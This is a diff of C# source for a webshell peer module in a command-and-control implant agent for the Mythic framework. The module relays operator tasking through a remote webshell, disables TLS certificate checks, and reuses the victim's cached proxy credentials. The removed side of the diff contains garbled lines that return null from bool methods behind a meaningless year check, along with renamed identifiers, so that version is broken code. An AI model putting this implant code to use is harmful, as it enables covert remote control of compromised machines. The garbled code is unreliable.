@@ -1,27 +1,27 @@
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.IO.Pipes;
 using System.Linq;
 using System.Text;
-using AI = PhantomInterop;
-using AS = PhantomInterop.Structs.PhantomStructs;
+using AI = ApolloInterop;
+using AS = ApolloInterop.Structs.ApolloStructs;
 using TTasks = System.Threading.Tasks;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Structs.PhantomStructs;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Structs.ApolloStructs;
 using Tasks;
-using PhantomInterop.Utils;
+using ApolloInterop.Utils;
 using System.Net;
 using System.IO;
 using System.Security.Policy;
-using PhantomInterop.Types.Delegates;
+using ApolloInterop.Types.Delegates;
 
-namespace Phantom.Peers.Webshell
+namespace Apollo.Peers.Webshell
 {
     public class WebshellPeer : AI.Classes.P2P.Peer
     {
-        private Action _transmitAction;
+        private Action _sendAction;
         private TTasks.Task _sendTask;
         private string _remote_url;
         private string _remote_query_param;
@@ -40,20 +40,20 @@ namespace Phantom.Peers.Webshell
             _remote_cookie_name = info.C2Profile.Parameters.WebshellCookieName;
             _remote_cookie_value = info.C2Profile.Parameters.WebshellCookieValue;
             _remote_user_agent = info.C2Profile.Parameters.WebshellUserAgent;
-            _transmitAction = () =>
+            _sendAction = () =>
             {
                 _mythicUUID = info.CallbackUUID;
                 OnUUIDNegotiated(this, new UUIDEventArgs(info.CallbackUUID));
-                
-                ServicePointManager.ServerCertificateValidationCallback = delegate { if(DateTime.Now.Year > 2020) { return true; } else { return null; } };
+                // Disable certificate validation on web requests
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                 ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                 while (!_cts.IsCancellationRequested)
                 {
-                    _msgSendEvent.WaitOne();
-                    if (!_cts.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] result))
+                    _senderEvent.WaitOne();
+                    if (!_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                     {
                         string data = Encoding.UTF8.GetString(result);
-                        
+                        //DebugHelp.DebugWriteLine($"Got data to send: {data}, _sendAction in WebshellPeer, to {_mythicUUID} from {_uuid}");
                         Send(data);
                     }
                 }
@@ -63,18 +63,18 @@ namespace Phantom.Peers.Webshell
         private void Send(string data)
         {
             WebClient webClient = new WebClient();
-            
+            // Use Default Proxy and Cached Credentials for Internet Access
             webClient.Proxy = WebRequest.GetSystemWebProxy();
             webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
             webClient.Headers.Add("User-Agent", _remote_user_agent);
-            
+            //webClient.BaseAddress = _remote_url;
             webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_remote_cookie_name}={_remote_cookie_value}");
             if (data.Length > 4000)
             {
-                
+                // do a POST
                 try
                 {
-                    
+                    //DebugHelp.DebugWriteLine($"Sending POST to {_remote_url}");
                     var response = webClient.UploadString(_remote_url, data);
                     Recv(response, "");
                 }
@@ -84,7 +84,7 @@ namespace Phantom.Peers.Webshell
                 }
             } else
             {
-                
+                // do a GET
                 string QueryURL = _remote_url;
                 if (QueryURL.Contains("?"))
                 {
@@ -95,7 +95,7 @@ namespace Phantom.Peers.Webshell
                 }
                 try
                 {
-                    
+                    //DebugHelp.DebugWriteLine($"Sending GET to {QueryURL}");
                     using (var stream = webClient.OpenRead(QueryURL))
                     {
                         using (var streamReader = new StreamReader(stream))
@@ -114,7 +114,7 @@ namespace Phantom.Peers.Webshell
         }
         private void Recv(string data, string error_message)
         {
-            
+            //DebugHelp.DebugWriteLine($"got response: {data} - {error_message}");
             if (error_message.Length > 0)
             {
                 return;
@@ -132,7 +132,7 @@ namespace Phantom.Peers.Webshell
                 Array.Copy(mythic_uuid_bytes, final_bytes, mythic_uuid_bytes.Length);
                 Array.Copy(raw, 0, final_bytes, mythic_uuid_bytes.Length, raw.Length);
                 string final_response = Convert.ToBase64String(final_bytes);
-                
+                //DebugHelp.DebugWriteLine($"got final response: {final_response}");
                 _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
                 {
                     MythicUUID = _mythicUUID,
@@ -145,25 +145,25 @@ namespace Phantom.Peers.Webshell
 
         public override bool Connected()
         {
-            
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            //DebugHelp.DebugWriteLine($"checking if Connected()");
+            return true;
         }
 
         public override bool Finished()
         {
-            
-            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+            //DebugHelp.DebugWriteLine($"checking if Finished()");
+            return false;
         }
 
         public override bool Start()
         {
-            
+            //DebugHelp.DebugWriteLine($"Start()");
             WebClient webClient = new WebClient();
-            
+            // Use Default Proxy and Cached Credentials for Internet Access
             webClient.Proxy = WebRequest.GetSystemWebProxy();
             webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
             webClient.Headers.Add("User-Agent", _remote_user_agent);
-            
+            //webClient.BaseAddress = _remote_url;
             webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_remote_cookie_name}={_remote_cookie_value}");
             string QueryURL = _remote_url;
             if (QueryURL.Contains("?"))
@@ -175,7 +175,7 @@ namespace Phantom.Peers.Webshell
             }
             try
             {
-                
+                //DebugHelp.DebugWriteLine($"Sending GET to {QueryURL}");
                 using (var stream = webClient.OpenRead(QueryURL))
                 {
                     using (var streamReader = new StreamReader(stream))
@@ -183,9 +183,9 @@ namespace Phantom.Peers.Webshell
                         streamReader.ReadToEnd();
                     }
                 }
-                _sendTask = new TTasks.Task(_transmitAction);
+                _sendTask = new TTasks.Task(_sendAction);
                 _sendTask.Start();
-                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                return true;
             }
             catch(Exception ex)
             {
@@ -195,9 +195,9 @@ namespace Phantom.Peers.Webshell
 
         public override void Stop()
         {
-            
+            //DebugHelp.DebugWriteLine($"Stop()");
             _cts.Cancel();
-            _msgSendEvent.Set();
+            _senderEvent.Set();
             if(_sendTask != null){
                 _sendTask.Wait();
             }
